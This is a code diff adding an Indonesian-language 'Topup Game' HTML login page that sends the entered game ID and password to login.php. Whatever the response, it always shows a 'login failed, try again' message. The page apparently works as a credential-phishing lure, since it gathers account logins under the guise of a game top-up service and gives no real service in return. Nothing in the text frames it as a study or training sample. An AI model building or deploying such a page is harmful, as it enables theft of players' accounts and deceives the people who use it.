@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Topup Game</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: #16213e; padding: 40px; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); width: 380px; }
+        .logo { text-align: center; font-size: 28px; color: #f5c842; font-weight: bold; margin-bottom: 20px; }
+        label { color: #aaa; font-size: 14px; display: block; margin: 10px 0 5px; }
+        input { width: 100%; padding: 12px; margin: 6px 0; border: none; border-radius: 6px; font-size: 16px; background: #0f3460; color: white; }
+        input:focus { outline: 2px solid #f5c842; }
+        button { width: 100%; padding: 14px; background: #f5c842; color: #1a1a2e; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        button:hover { background: #e6b83a; }
+        .error { color: #ff6b6b; text-align: center; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <div class="logo">🎮 TOPUP GAME</div>
+    <form id="loginForm">
+        <label>Game ID / Username</label>
+        <input type="text" id="username" placeholder="Masukkan User ID" required>
+        <label>Password</label>
+        <input type="password" id="password" placeholder="Masukkan Password" required>
+        <button type="submit">Login & Topup</button>
+        <div class="error" id="errorMsg">Login gagal, coba lagi!</div>
+    </form>
+</div>
+<script>
+document.getElementById('loginForm').onsubmit = function(e) {
+    e.preventDefault();
+    var user = document.getElementById('username').value;
+    var pass = document.getElementById('password').value;
+    fetch('login.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'username=' + encodeURIComponent(user) + '&password=' + encodeURIComponent(pass)
+    })
+    .then(res => res.json())
+    .then(data => {
+        document.getElementById('errorMsg').style.display = 'block';
+    });
+};
+</script>
+</body>
+</html>
